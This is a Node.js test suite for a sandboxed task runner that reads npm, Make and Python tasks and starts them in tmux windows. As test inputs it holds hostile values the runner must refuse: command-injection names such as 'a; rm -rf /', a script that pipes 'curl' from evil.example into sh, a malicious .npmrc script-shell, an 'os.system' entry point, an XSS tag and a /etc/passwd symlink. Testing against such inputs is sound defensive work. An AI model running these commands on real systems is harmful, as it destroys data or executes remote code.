// bn-coded's Run & test ops (terminal/bin/bn-coded.mjs): the workspace's tasks read from package.json, the Makefile and
// pyproject.toml (hostile files: huge, odd names, injection attempts, links, FIFOs — and linear time on all of them),
// one started by name through its fixed wrapper in a window of the terminal's tmux only while it is what the page
// showed (its digest), the runner that keeps its exit status and the last 64 KiB of its output, the list of runs and
// a run's window — with a stand-in tmux that records what it was asked and runs the window's command like tmux would.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { tmp, talk, open, result, TERMINAL_DIR } from './helpers.mjs';

const ROOT = tmp('bnrun');
const WS = path.join(ROOT, 'ws'), SOCKDIR = path.join(ROOT, 'sock'), RUNS = path.join(ROOT, 'runs'), LOG = path.join(ROOT, 'tmux.log');
fs.mkdirSync(WS);
// a stand-in tmux: records its arguments (one per line, then ---); "has-session" fails until "new-session" ran;
// "new-window" runs what follows "--" in the folder of -c (in the background, as tmux would in its window) and prints
// a window id; "select-window" knows only @7
const TMUX = path.join(ROOT, 'tmux');
fs.writeFileSync(TMUX, `#!/bin/sh
for a in "$@"; do printf '%s\\n' "$a" >> ${JSON.stringify(LOG)}; done; echo --- >> ${JSON.stringify(LOG)}
case "$1" in
  has-session) [ -e ${JSON.stringify(path.join(ROOT, 'session'))} ] || exit 1 ;;
  new-session) : > ${JSON.stringify(path.join(ROOT, 'session'))} ;;
  new-window)
    cwd=.
    while [ $# -gt 0 ]; do case "$1" in -c) cwd=$2; shift 2 ;; --) shift; break ;; *) shift ;; esac; done
    [ -e ${JSON.stringify(path.join(ROOT, 'norun'))} ] || ( cd "$cwd" && "$@" </dev/null >>${JSON.stringify(path.join(ROOT, 'window.out'))} 2>&1 & )
    echo @7 ;;
  select-window) [ "$3" = "@7" ] || { echo "can't find window: $3" >&2; exit 1; } ;;
esac
exit 0
`, { mode: 0o755 });
Object.assign(process.env, { BN_CODE_WORKSPACE: WS, BN_CODE_SOCK_DIR: SOCKDIR, BN_CODE_CHILDREN: path.join(ROOT, 'children'), BN_TMUX_BIN: TMUX,
  BN_CODE_RUNS: RUNS, HOME: ROOT, CLAUDE_CONFIG_DIR: path.join(ROOT, '.claude') });
// a stand-in make on PATH (the sandbox's image has none: its Makefile targets are then listed, not offered — below)
const MAKEBIN = path.join(ROOT, 'makebin');
fs.mkdirSync(MAKEBIN);
fs.writeFileSync(path.join(MAKEBIN, 'make'), '#!/bin/sh\necho "make $*"\n', { mode: 0o755 });
process.env.PATH = `${MAKEBIN}:${process.env.PATH}`;
const coded = await import(path.join(TERMINAL_DIR, 'bin/bn-coded.mjs'));
const SELF = path.join(TERMINAL_DIR, 'bin/bn-coded.mjs');
let server;
const SOCK = path.join(SOCKDIR, 'coded.sock');
before(async () => { server = coded.start(); await new Promise((r) => (server.listening ? r() : server.once('listening', r))); });
after(() => { server.close(); fs.rmSync(ROOT, { recursive: true, force: true }); });

const ws = (name, text) => fs.writeFileSync(path.join(WS, name), text);
const rm = (name) => fs.rmSync(path.join(WS, name), { force: true, recursive: true });
const op = async (req) => result(await talk(SOCK, [open(req)]));
const calls = () => (fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.replace(/\n$/, '').split('\n')) : []);
const ms = (f) => { const t = process.hrtime.bigint(); f(); return Number(process.hrtime.bigint() - t) / 1e6; };
const until = async (f, what, timeoutMs = 10000) => {
  const t0 = Date.now();
  for (;;) {
    const v = await f();
    if (v) return v;
    if (Date.now() - t0 > timeoutMs) throw new Error(`timed out: ${what}`);
    await new Promise((r) => setTimeout(r, 50));
  }
};

test('package.json: each script with npm\'s pre/post scripts, run as `npm run -- <name>`; odd names listed, never offered', () => {
  const r = coded.npmTasks(JSON.stringify({ scripts: {
    test: 'vitest run', pretest: 'tsc --noEmit', posttest: 'echo done', 'lint:fix': 'eslint --fix .', 'build/web': 'vite build',
    'a; rm -rf /': 'x', '$(touch /tmp/pwned)': 'x', 'x\ny': 'x', '--version': 'x', '-x': 'x', '`id`': 'x', 'a b': 'x', 'ü': 'x', '': 'x',
    ['n'.repeat(101)]: 'x', __proto__: 'proto', constructor: 'echo c', num: 7, long: 'x'.repeat(coded.TASK_TEXT_MAX + 1) } }));
  const by = Object.fromEntries(r.tasks.map((t) => [t.name, t]));
  assert.deepEqual(by.test.argv, ['npm', 'run', '--', 'test']);
  assert.equal(by.test.command, 'npm run -- test');
  assert.deepEqual(by.test.detail, [{ name: 'pretest', text: 'tsc --noEmit' }, { name: 'test', text: 'vitest run' }, { name: 'posttest', text: 'echo done' }]);
  assert.equal(by.test.cwd, '.');
  assert.match(by.test.digest, /^[0-9a-f]{64}$/);
  assert.deepEqual(by['lint:fix'].argv, ['npm', 'run', '--', 'lint:fix']);
  assert.deepEqual(by['build/web'].argv, ['npm', 'run', '--', 'build/web']);
  assert.deepEqual(by.constructor.argv, ['npm', 'run', '--', 'constructor']);   // (own keys only: never Object's)
  for (const odd of ['a; rm -rf /', '$(touch /tmp/pwned)', 'x\ny', '--version', '-x', '`id`', 'a b', 'ü', '', 'n'.repeat(101)]) {
    assert.ok(by[odd]?.error && !by[odd].argv, JSON.stringify(odd));
  }
  assert.match(by.num.error, /not a string/);
  assert.match(by.long.error, /too long/);
  assert.ok(!r.tasks.some((t) => t.argv && t.argv.some((a) => /[;$`\n ]/.test(a))), 'a wrapper argument with a shell character');
  // JSON.parse makes "__proto__" an own key: a name like any other (npm has one too), never the prototype
  const p = coded.npmTasks('{"scripts": {"__proto__": "echo p", "x": "echo x"}}');
  assert.deepEqual(p.tasks.map((t) => t.name), ['__proto__', 'x']);
  assert.deepEqual(coded.npmTasks('{"name": "x"}'), { tasks: [], more: false });
  for (const [bad, why] of [['{', /not valid JSON/], ['[]', /not a JSON object/], ['{"scripts": []}', /not an object/], ['{"scripts": "npm test"}', /not an object/], ['null', /not a JSON object/]]) {
    assert.match(coded.npmTasks(bad).error, why, bad);
  }
});

test('package.json: a huge file is read in linear time; at most 100 tasks listed (and "more")', () => {
  const scripts = {};
  for (let i = 0; i < 40000; i++) scripts[`s${i}`] = `echo ${i}`;
  const text = JSON.stringify({ scripts });
  let r;
  const t = ms(() => { r = coded.npmTasks(text); });
  assert.equal(r.tasks.length, coded.TASKS_MAX);
  assert.equal(r.more, true);
  assert.ok(t < 2000, `${t} ms`);
  // names and scripts shaped to make a regular expression backtrack
  const nasty = coded.npmTasks(JSON.stringify({ scripts: { [`${'a:'.repeat(5000)}!`]: 'x', [`${'a'.repeat(50000)};`]: 'y' } }));
  assert.ok(nasty.tasks.every((x) => x.error && x.name.length <= 200));
});

test('.npmrc: its setting names shown, its hash bound to every npm task; one that is a link refuses npm tasks', async () => {
  assert.deepEqual(coded.npmrcKeys('# c\nscript-shell=/workspace/evil.sh\n; c\nnode-options = --require ./x.js\n\nregistry=https://r\nregistry=again\n\x1b[31m=1'),
    ['script-shell', 'node-options', 'registry', '?[31m']);
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run' } }));
  const plain = (await op({ op: 'run.list' })).tasks.find((t) => t.name === 'test');
  assert.deepEqual(plain.files, []);
  ws('.npmrc', 'script-shell=/workspace/evil.sh\n');
  const withRc = (await op({ op: 'run.list' })).tasks.find((t) => t.name === 'test');
  assert.equal(withRc.files[0].path, '.npmrc');
  assert.match(withRc.files[0].sha256, /^[0-9a-f]{64}$/);
  assert.match(withRc.notes[0], /script-shell/);
  assert.notEqual(withRc.digest, plain.digest);
  ws('.npmrc', 'script-shell=/workspace/other.sh\n');
  assert.notEqual((await op({ op: 'run.list' })).tasks.find((t) => t.name === 'test').digest, withRc.digest);
  rm('.npmrc');
  fs.symlinkSync(path.join(ROOT, 'elsewhere.npmrc'), path.join(WS, '.npmrc'));
  const r = await op({ op: 'run.list' });
  assert.equal(r.tasks.filter((t) => t.source === 'npm').length, 0);
  assert.match(r.sources.find((s) => s.source === 'npm').error, /\.npmrc is a link/);
  rm('.npmrc'); rm('package.json');
});

test('Makefile: `name:` lines with their recipes; special targets, patterns, variables and assignments skipped', () => {
  const mf = [
    '# a comment: not: a target', '.PHONY: all test', 'X := 1', 'Y ::= 2', 'Z = a:b', 'W ?= c', 'all: build test', '\t@echo all done',
    'build:', '\tnode build.mjs', '\techo built', '', 'test check:  build', '\tpytest -q', '%.o: %.c', '\tcc -c $<', '$(OUT): x', '\techo out',
    '${OUT2}: x', 'a;b: x', 'deploy:: x', '\techo twice', 'deploy::', '\techo again', 'win:\r', '\techo crlf\r', ' indented: x',
    'rm -rf /: x', '$(shell touch /tmp/pwned): x', '-bad: x', 'üml: x', 'path/to/x: y', 'include other.mk', '-include maybe.mk',
    'long:', ...Array.from({ length: 45 }, (_, i) => `\techo ${i}`), 'all: more-deps', '\techo second recipe for all',
  ].join('\n');
  const r = coded.makeTargets(mf);
  const by = Object.fromEntries(r.targets.map((t) => [t.name, t]));
  assert.deepEqual(Object.keys(by), ['all', 'build', 'test', 'check', 'deploy', 'win', 'rm', '-rf', '/', '-bad', 'üml', 'path/to/x', 'long']);
  assert.equal(by.all.recipe, '@echo all done');
  assert.equal(by.build.recipe, 'node build.mjs\necho built');
  assert.equal(by.test.recipe, 'pytest -q');
  assert.equal(by.check.recipe, 'pytest -q');
  assert.equal(by.deploy.recipe, 'echo twice');
  assert.equal(by.win.recipe, 'echo crlf');
  assert.match(by.long.recipe, /^echo 0\n[\s\S]*echo 39\n… \(5 more lines in the file\)$/);
  for (const odd of ['-rf', '/', '-bad', 'üml']) assert.ok(by[odd].error, odd);
  assert.equal(by.rm.error, undefined);   // ("rm -rf /: x" names three targets; `make -- rm` runs only make's own target "rm")
  assert.equal(r.includes, true);
  assert.equal(coded.makeTargets('all:\n\techo').includes, false);
});

test('Makefile: hostile files take linear time (long lines, many colons and tabs, a 1 MiB recipe)', () => {
  const cases = {
    colons: ':'.repeat(1 << 20),
    head: `${'a '.repeat(500000)}:`,
    tabs: `x:\n${'\t'.repeat(1 << 20)}`,
    lines: 'a:\n'.repeat(300000),
    recipe: `x:\n${'\techo y\n'.repeat(140000)}`,
    vars: `${'$('.repeat(300000)}:`,
    includes: 'include '.repeat(100000),
  };
  for (const [name, text] of Object.entries(cases)) {
    let r;
    const t = ms(() => { r = coded.makeTargets(text); });
    assert.ok(t < 2000, `${name}: ${t} ms`);
    assert.ok(r.targets.length <= coded.TASKS_MAX, name);
  }
});

test('pyproject.toml: [project.scripts] and [tool.poetry.scripts] entry points; other forms listed, not offered', () => {
  const text = [
    '[project]', 'name = "app"', 'scripts = "not here"', '[project.scripts]', 'hello = "app.cli:main"', "single = 'app.cli:other'",
    '"quoted-name" = "app.cli:main"', 'extras = "app.cli:main [cli]"', 'table = { reference = "x", type = "file" }', 'nocolon = "app.cli"',
    'inject = "os:system(\'id\')"', 'bad name = "a:b"', 'deep = "a.b.c:Obj.method"', 'hello = "app.other:dup"', '# comment = "a:b"',
    '[ tool.poetry.scripts ]  # spaced', 'serve = "app.server:run"', '[tool.other]', 'nope = "x:y"', '[[project.scripts]]', 'arr = "x:y"',
  ].join('\n');
  const r = coded.pyEntries(text);
  const by = Object.fromEntries(r.entries.map((e) => [e.name, e]));
  assert.deepEqual(Object.keys(by), ['hello', 'single', 'quoted-name', 'extras', 'table', 'nocolon', 'inject', 'bad name', 'deep', 'serve']);
  assert.deepEqual([by.hello.ref, by.single.ref, by['quoted-name'].ref, by.deep.ref, by.serve.ref], ['app.cli:main', 'app.cli:other', 'app.cli:main', 'a.b.c:Obj.method', 'app.server:run']);
  assert.equal(by.serve.table, 'tool.poetry.scripts');
  for (const odd of ['extras', 'table', 'nocolon', 'inject', 'bad name']) assert.ok(by[odd].error, odd);
  // linear on hostile lines
  for (const text2 of [`[project.scripts]\na = "${'a.'.repeat(200000)}:"`, `[project.scripts]\n${'x = "a:b"\n'.repeat(100000)}`, `[${' '.repeat(1 << 20)}`,
    `[project.scripts]\n${'='.repeat(1 << 20)}`, `[project.scripts]\na = "${'a'.repeat(1 << 20)}`]) {
    const t = ms(() => coded.pyEntries(text2));
    assert.ok(t < 2000, `${t} ms`);
  }
});

test('run.list over the socket: every source with its file; a link or a FIFO is not read; the digest changes with what runs', async () => {
  assert.deepEqual(await op({ op: 'run.list' }), { sources: [
    { source: 'npm', file: 'package.json', exists: false, error: null, more: false },
    { source: 'make', file: 'Makefile', exists: false, error: null, more: false },
    { source: 'python', file: 'pyproject.toml', exists: false, error: null, more: false }], tasks: [] });
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run' } }));
  ws('Makefile', 'check:\n\tpytest -q\n');
  ws('pyproject.toml', '[project.scripts]\nhello = "app.cli:main"\n');
  const r = await op({ op: 'run.list' });
  assert.deepEqual(r.tasks.map((t) => [t.source, t.name, t.argv.length]), [['npm', 'test', 4], ['make', 'check', 3], ['python', 'hello', 5]]);
  const py = r.tasks[2];
  assert.deepEqual(py.argv, ['python3', '-c', coded.PY_LOADER, 'hello', 'app.cli:main']);
  assert.equal(r.tasks[1].files[0].path, 'Makefile');
  // the whole Makefile is bound: a variable elsewhere in it changes the digest
  const before1 = r.tasks[1].digest;
  ws('Makefile', 'PYTEST = rm -rf ~\ncheck:\n\tpytest -q\n');
  assert.notEqual((await op({ op: 'run.list' })).tasks.find((t) => t.name === 'check').digest, before1);
  // GNU make's order: GNUmakefile first
  ws('GNUmakefile', 'gnu:\n\techo gnu\n');
  let s = await op({ op: 'run.list' });
  assert.equal(s.sources[1].file, 'GNUmakefile');
  assert.deepEqual(s.tasks.filter((t) => t.source === 'make').map((t) => t.name), ['gnu']);
  rm('GNUmakefile');
  // without make in the sandbox: the targets are listed with the reason, none offered
  const PATH0 = process.env.PATH;
  fs.mkdirSync(path.join(ROOT, 'nomake'), { recursive: true });
  process.env.PATH = path.join(ROOT, 'nomake');
  try {
    s = await op({ op: 'run.list' });
    assert.match(s.sources[1].error, /make is not installed in the sandbox/);
    assert.deepEqual(s.tasks.filter((t) => t.source === 'make').map((t) => [t.name, t.error, t.argv]), [['check', 'make is not installed in the sandbox', undefined]]);
  } finally { process.env.PATH = PATH0; }
  // links are not followed (the file could be anywhere); a FIFO does not hang the list
  fs.writeFileSync(path.join(ROOT, 'outside.json'), JSON.stringify({ scripts: { out: 'x' } }));
  rm('package.json');
  fs.symlinkSync(path.join(ROOT, 'outside.json'), path.join(WS, 'package.json'));
  s = await op({ op: 'run.list' });
  assert.match(s.sources[0].error, /link/);
  assert.equal(s.tasks.filter((t) => t.source === 'npm').length, 0);
  rm('package.json');
  try { execFileSync('mkfifo', [path.join(WS, 'package.json')]); } catch { /* no mkfifo here */ }
  if (fs.existsSync(path.join(WS, 'package.json'))) assert.match((await op({ op: 'run.list' })).sources[0].error, /not a file/);
  rm('package.json');
  fs.writeFileSync(path.join(WS, 'package.json'), Buffer.alloc((1 << 20) + 1, 0x20));
  assert.match((await op({ op: 'run.list' })).sources[0].error, /larger than 1 MiB/);
  rm('package.json'); rm('Makefile'); rm('pyproject.toml');
});

test('the code container\'s digest of a task is bn-coded\'s, and its loader the same', async (t) => {
  let api;
  try { api = await import('../server/api.mjs'); } catch { t.skip('the backend\'s dependencies are not installed here (code/test.sh runs it)'); return; }
  assert.equal(api.PY_LOADER, coded.PY_LOADER);
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run', pretest: 'tsc', 'odd name': 'x' } }));
  ws('.npmrc', 'node-options=--require ./x.js\n');
  ws('Makefile', 'include x.mk\ncheck:\n\tpytest -q\n');
  ws('pyproject.toml', '[project.scripts]\nhello = "app.cli:main"\n');
  const r = await op({ op: 'run.list' });
  for (const task of r.tasks) {
    const row = api.runTaskRow(task);
    if (task.error) { assert.equal(row.error, task.error.slice(0, 300)); continue; }
    assert.equal(row.digest, task.digest, task.name);
    assert.deepEqual(row.argv, task.argv);
  }
  for (const s of r.sources) assert.deepEqual(api.runSourceRow(s), s);
  rm('package.json'); rm('.npmrc'); rm('Makefile'); rm('pyproject.toml');
});

test('run.start: the task\'s fixed wrapper in a new tmux window (the session made first), never the page\'s command', async () => {
  fs.rmSync(LOG, { force: true });
  fs.writeFileSync(path.join(ROOT, 'norun'), '');
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run' } }));
  const listed = (await op({ op: 'run.list' })).tasks[0];
  const r = await op({ op: 'run.start', source: 'npm', name: 'test', digest: listed.digest, command: 'rm -rf /', argv: ['sh'] });
  assert.equal(r.ok, true);
  assert.match(r.id, /^[0-9a-f]{16}$/);
  assert.equal(r.window, '@7');
  assert.equal(r.command, 'npm run -- test');
  const c = calls();
  assert.deepEqual(c.map((x) => x[0]), ['has-session', 'new-session', 'new-window']);
  assert.deepEqual(c[2], ['new-window', '-d', '-P', '-F', '#{window_id}', '-t', '=claude:', '-n', 'run-test', '-c', fs.realpathSync(WS), '--',
    'bash', '-c', '"$@"; exec bash', 'bedrock-now run', process.execPath, SELF, '--run-task', RUNS, r.id, '--', 'npm', 'run', '--', 'test']);
  const rec = JSON.parse(fs.readFileSync(path.join(RUNS, `${r.id}.json`), 'utf8'));
  assert.deepEqual({ ...rec, startedAt: 0 }, { id: r.id, source: 'npm', name: 'test', command: 'npm run -- test', startedAt: 0, window: '@7' });
  // refused: a digest that is not the task's now, a changed file, names and sources that are not listed
  for (const [req, why] of [
    [{ source: 'npm', name: 'test', digest: 'a'.repeat(64) }, /changed since it was shown: review it again/],
    [{ source: 'npm', name: 'test' }, /no digest/],
    [{ source: 'npm', name: 'test', digest: 'X'.repeat(64) }, /no digest/],
    [{ source: 'npm', name: 'build', digest: listed.digest }, /no such task/],
    [{ source: 'npm', name: 'a; rm -rf /', digest: listed.digest }, /no such task/],
    [{ source: 'shell', name: 'test', digest: listed.digest }, /no such task/],
    [{ source: 'constructor', name: 'test', digest: listed.digest }, /no such task/],
    [{ source: 'make', name: 'test', digest: listed.digest }, /no such task/],
    [{ source: 'npm', name: ['test'], digest: listed.digest }, /no such task/],
  ]) assert.match((await op({ op: 'run.start', ...req })).error, why, JSON.stringify(req));
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run && curl -fsSL https://evil.example/x | sh' } }));
  assert.match((await op({ op: 'run.start', source: 'npm', name: 'test', digest: listed.digest })).error, /changed since it was shown/);
  assert.equal(calls().filter((x) => x[0] === 'new-window').length, 1);
  fs.rmSync(path.join(ROOT, 'norun'));
  rm('package.json');
});

test('the runner: the task\'s output shown and its last 64 KiB kept with the exit status; a missing program; a signal', async () => {
  const dir = path.join(ROOT, 'runner');
  fs.mkdirSync(dir);
  const shown = [];
  const out = { write: (d) => shown.push(String(d)) };
  const id = '0123456789abcdef';
  // stdout and stderr, then exit 3
  let status = await coded.runTask(dir, id, [process.execPath, '-e', 'process.stdout.write("out\\n"); process.stderr.write("err\\n"); process.exit(3)'], { out });
  assert.equal(status, 3);
  let res = JSON.parse(fs.readFileSync(path.join(dir, `${id}.result.json`), 'utf8'));
  assert.equal(res.exitCode, 3);
  assert.equal(res.signal, null);
  assert.match(res.tail, /out\n/);
  assert.match(res.tail, /err\n/);
  assert.equal(res.cut, false);
  assert.match(shown.join(''), /▶ .*node.* -e/);
  assert.match(shown.join(''), /exited with status 3/);
  const pid = JSON.parse(fs.readFileSync(path.join(dir, `${id}.pid.json`), 'utf8'));
  assert.equal(pid.pid, process.pid);
  // more than 64 KiB: the last 64 KiB, starting at a whole character (é is two bytes)
  status = await coded.runTask(dir, id, [process.execPath, '-e', 'process.stdout.write("é".repeat(50000) + "THE END")'], { out: { write() {} } });
  res = JSON.parse(fs.readFileSync(path.join(dir, `${id}.result.json`), 'utf8'));
  assert.equal(status, 0);
  assert.equal(res.cut, true);
  assert.equal(res.bytes, 100007);
  assert.ok(Buffer.byteLength(res.tail) <= coded.RUN_TAIL && Buffer.byteLength(res.tail) >= coded.RUN_TAIL - 1, String(Buffer.byteLength(res.tail)));
  assert.ok(res.tail.endsWith('THE END') && !res.tail.includes('\ufffd'));
  // no such program
  status = await coded.runTask(dir, id, ['no-such-program-bn'], { out: { write() {} } });
  res = JSON.parse(fs.readFileSync(path.join(dir, `${id}.result.json`), 'utf8'));
  assert.equal(res.error, 'no-such-program-bn: not found');
  assert.equal(status, 1);
  // ended by a signal
  status = await coded.runTask(dir, id, [process.execPath, '-e', 'process.kill(process.pid, "SIGTERM")'], { out: { write() {} } });
  res = JSON.parse(fs.readFileSync(path.join(dir, `${id}.result.json`), 'utf8'));
  assert.equal(res.signal, 'SIGTERM');
  assert.equal(status, 128 + 15);
  // bad arguments: nothing runs
  assert.equal(await coded.runTask(dir, '../x', ['true'], { out: { write() {} } }), 2);
  assert.equal(await coded.runTask(dir, id, [], { out: { write() {} } }), 2);
});

test('run.start → the runner in the window → run.results (exit status, the end of the output) → run.show', async () => {
  fs.rmSync(LOG, { force: true });
  fs.rmSync(RUNS, { recursive: true, force: true });
  // a "npm" of our own first on PATH would be the sandbox's business; here the wrapper's program is checked as given:
  // a package.json whose script fails, run through a stand-in npm that runs the script like npm does
  const bin = path.join(ROOT, 'bin');
  fs.mkdirSync(bin, { recursive: true });
  fs.writeFileSync(path.join(bin, 'npm'), `#!/bin/sh
[ "$1" = run ] && [ "$2" = -- ] || { echo "unexpected: $*" >&2; exit 64; }
exec ${JSON.stringify(process.execPath)} -e 'const s = require("./package.json").scripts[process.argv[1]]; require("child_process").execSync(s, { stdio: "inherit", shell: "/bin/sh" })' "$3"
`, { mode: 0o755 });
  const PATH0 = process.env.PATH;
  process.env.PATH = `${bin}:${PATH0}`;
  try {
    ws('package.json', JSON.stringify({ scripts: { fails: 'echo "1 test failed"; exit 1', passes: 'echo all good' } }));
    const tasks = (await op({ op: 'run.list' })).tasks;
    const start = async (name) => op({ op: 'run.start', source: 'npm', name, digest: tasks.find((t) => t.name === name).digest });
    const a = await start('fails');
    const done = (id) => until(async () => (await op({ op: 'run.results', id })).runs.find((x) => x.state === 'done'), `run ${id}`);
    const ra = await done(a.id);
    assert.equal(ra.exitCode, 1);
    assert.match(ra.tail, /1 test failed/);
    assert.equal(ra.name, 'fails');
    const b = await start('passes');
    const rb = await done(b.id);
    assert.equal(rb.exitCode, 0);
    assert.match(rb.tail, /all good/);
    const list = (await op({ op: 'run.results' })).runs;
    assert.deepEqual(list.map((x) => x.id), [b.id, a.id]);   // newest first
    // its window, made the current one; a run whose window is unknown, a bad id: refused
    assert.deepEqual(await op({ op: 'run.show', id: a.id }), { ok: true, window: '@7' });
    assert.deepEqual(calls().filter((x) => x[0] === 'select-window').pop(), ['select-window', '-t', '@7']);
    assert.match((await op({ op: 'run.show', id: 'f'.repeat(16) })).error, /no window/);
    assert.match((await op({ op: 'run.show', id: '../../etc' })).error, /bad run id/);
    assert.match((await op({ op: 'run.results', id: 'x' })).error, /bad run id/);
    const rec = JSON.parse(fs.readFileSync(path.join(RUNS, `${b.id}.json`), 'utf8'));
    fs.writeFileSync(path.join(RUNS, `${b.id}.json`), JSON.stringify({ ...rec, window: '@8;kill-server' }));
    assert.match((await op({ op: 'run.show', id: b.id })).error, /no window/);
    fs.writeFileSync(path.join(RUNS, `${b.id}.json`), JSON.stringify({ ...rec, window: '@9' }));
    assert.match((await op({ op: 'run.show', id: b.id })).error, /its window is closed/);
  } finally { process.env.PATH = PATH0; }
  rm('package.json');
});

test('run.results: the last 20 runs, the list\'s tails cut to 4 KiB, running and lost runs, junk in the folder ignored', async () => {
  fs.rmSync(RUNS, { recursive: true, force: true });
  fs.mkdirSync(RUNS, { mode: 0o700 });
  const put = (name, v) => fs.writeFileSync(path.join(RUNS, name), typeof v === 'string' ? v : JSON.stringify(v));
  const now = Date.now();
  for (let i = 0; i < 25; i++) {
    const id = i.toString(16).padStart(16, '0');
    put(`${id}.json`, { id, source: 'npm', name: `t${i}`, command: `npm run -- t${i}`, startedAt: now - 100000 + i, window: '@7' });
    put(`${id}.result.json`, { id, exitCode: i % 2, signal: null, error: null, startedAt: now - 100000 + i, endedAt: now, bytes: 9000, cut: false, tail: `${'x'.repeat(8000)}END${i}` });
  }
  // running (its runner is this process), lost (no runner, no result, long ago), and junk
  put('aaaaaaaaaaaaaaaa.json', { id: 'aaaaaaaaaaaaaaaa', source: 'make', name: 'watch', command: 'make -- watch', startedAt: now, window: '@7' });
  put('aaaaaaaaaaaaaaaa.pid.json', { pid: process.pid, start: fs.readFileSync(`/proc/${process.pid}/stat`, 'utf8').replace(/^.*\) /s, '').split(' ')[19] });
  put('bbbbbbbbbbbbbbbb.json', { id: 'bbbbbbbbbbbbbbbb', source: 'npm', name: 'gone', command: 'npm run -- gone', startedAt: now - 60000, window: null });
  put('cccccccccccccccc.json', '{not json');
  put('dddddddddddddddd.json', { id: 'eeeeeeeeeeeeeeee', source: 'npm' });   // (an id not its own)
  put('notes.txt', 'x');
  fs.symlinkSync('/etc/passwd', path.join(RUNS, 'ffffffffffffffff.json'));
  const r = await op({ op: 'run.results' });
  assert.equal(r.runs.length, 20);
  assert.deepEqual(r.runs.slice(0, 3).map((x) => [x.name, x.state]), [['watch', 'running'], ['gone', 'lost'], ['t24', 'done']]);
  const t24 = r.runs[2];
  assert.equal(t24.tail.length, 4096);
  assert.ok(t24.tail.endsWith('END24') && t24.cut === true);
  const one = (await op({ op: 'run.results', id: (24).toString(16).padStart(16, '0') })).runs;
  assert.equal(one.length, 1);
  assert.equal(one[0].tail.length, 8005);
  assert.equal(one[0].cut, false);
});

test('run.start keeps the last 20 runs (the oldest go, with their files); at most 8 run at once', async () => {
  // (the folder of the test above: 27 records)
  fs.writeFileSync(path.join(ROOT, 'norun'), '');
  ws('package.json', JSON.stringify({ scripts: { test: 'vitest run' } }));
  const digest = (await op({ op: 'run.list' })).tasks[0].digest;
  const r = await op({ op: 'run.start', source: 'npm', name: 'test', digest });
  assert.equal(r.ok, true);
  // (regular files: the link the test above put there is junk, never read, never a run)
  const records = fs.readdirSync(RUNS).filter((n) => /^[0-9a-f]{16}\.json$/.test(n) && fs.lstatSync(path.join(RUNS, n)).isFile());
  assert.equal(records.length, 20);
  assert.ok(records.includes(`${r.id}.json`));
  assert.ok(fs.readdirSync(RUNS).filter((n) => /^[0-9a-f]{16}\.result\.json$/.test(n)).length <= 19);
  // eight runs whose runner is alive (this process): a ninth is refused
  fs.rmSync(RUNS, { recursive: true, force: true });
  fs.mkdirSync(RUNS, { mode: 0o700 });
  const start = fs.readFileSync(`/proc/${process.pid}/stat`, 'utf8').replace(/^.*\) /s, '').split(' ')[19];
  for (let i = 0; i < 8; i++) {
    const id = `${'a'.repeat(15)}${i}`;
    fs.writeFileSync(path.join(RUNS, `${id}.json`), JSON.stringify({ id, source: 'npm', name: 'test', command: 'npm run -- test', startedAt: Date.now(), window: '@7' }));
    fs.writeFileSync(path.join(RUNS, `${id}.pid.json`), JSON.stringify({ pid: process.pid, start }));
  }
  assert.match((await op({ op: 'run.start', source: 'npm', name: 'test', digest })).error, /8 tasks run already/);
  fs.rmSync(path.join(ROOT, 'norun'));
  rm('package.json');
});

test('the code container passes only the fixed wrappers and checked runs to the page', async (t) => {
  let api;
  try { api = await import('../server/api.mjs'); } catch { t.skip('the backend\'s dependencies are not installed here (code/test.sh runs it)'); return; }
  const base = { source: 'npm', name: 'test', argv: ['npm', 'run', '--', 'test'], cwd: '.', command: 'npm run -- test', detail: [{ name: 'test', text: 'vitest run' }], files: [], notes: [] };
  assert.equal(api.runTaskRow(base).digest, coded.runDigest(base));
  for (const [bad, why] of [
    [{ argv: ['sh', '-c', 'rm -rf /'] }, /not run the way/], [{ argv: ['npm', 'run', 'test'] }, /not run the way/], [{ argv: ['npm', 'run', '--', 'other'] }, /not run the way/],
    [{ source: 'make', argv: ['make', 'test'] }, /not run the way/], [{ source: 'python', argv: ['python3', '-c', 'import os; os.system("id")', 'test', 'a:b'] }, /not run the way/],
    [{ detail: [{ name: 'test', text: 'x'.repeat(8001) }] }, /cannot be shown/], [{ detail: [] }, /cannot be shown/], [{ detail: [{ name: 'a\nb', text: 'x' }] }, /cannot be shown/],
    [{ files: [{ path: '../x', sha256: 'a'.repeat(64) }] }, /files/], [{ files: [{ path: '.npmrc', sha256: 'zz' }] }, /files/], [{ cwd: 'sub' }, /top folder/],
  ]) assert.match(api.runTaskRow({ ...base, ...bad }).error, why, JSON.stringify(bad));
  assert.equal(api.runTaskRow({ ...base, name: 'a; rm -rf /' }), null);
  assert.equal(api.runTaskRow({ ...base, source: 'shell' }), null);
  assert.deepEqual(api.runTaskRow({ source: 'npm', name: '<img src=x onerror=alert(1)>\n', error: 'x'.repeat(500) }), { source: 'npm', name: '<img src=x onerror=alert(1)> ', error: 'x'.repeat(300) });
  const run = api.runResultRow({ id: 'a'.repeat(16), source: 'npm', name: 'test\u001b[31m', command: 'npm run -- test', window: '@7;x', startedAt: 1, state: 'done',
    exitCode: 300, signal: 'KILL', error: 7, endedAt: 2, bytes: -1, tail: 'y'.repeat(70000), cut: 'yes' }, 4096);
  assert.deepEqual({ ...run, tail: run.tail.length }, { id: 'a'.repeat(16), source: 'npm', name: 'test [31m', command: 'npm run -- test', window: null, startedAt: 1, state: 'done',
    exitCode: null, signal: null, error: null, endedAt: 2, bytes: null, tail: 4096, cut: true });
  for (const bad of [{ id: 'x' }, { id: 'a'.repeat(16), source: 'npm', state: 'weird' }, { id: 'a'.repeat(16), source: 'sh', state: 'done' }, null, 'x']) assert.equal(api.runResultRow(bad), null);
});
